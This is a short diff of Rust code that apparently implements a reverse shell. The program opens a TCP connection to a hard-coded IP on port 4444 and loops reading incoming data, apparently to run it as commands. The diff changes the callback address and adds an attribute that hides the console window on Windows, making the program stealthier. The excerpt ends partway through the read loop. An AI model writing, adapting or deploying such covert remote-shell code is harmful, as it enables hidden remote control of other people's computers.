@@ -1,9 +1,11 @@
+#![windows_subsystem = "windows"]
+
 use std::io::{Read, Write};
 use std::net::TcpStream;
 use std::process::{Command, Stdio};
 
 fn main() {
-    if let Ok(mut stream) = TcpStream::connect("192.168.111.1:4444") {
+    if let Ok(mut stream) = TcpStream::connect("172.18.225.53:4444") {
         loop {
             let mut buffer = [0; 1024];
             match stream.read(&mut buffer) {
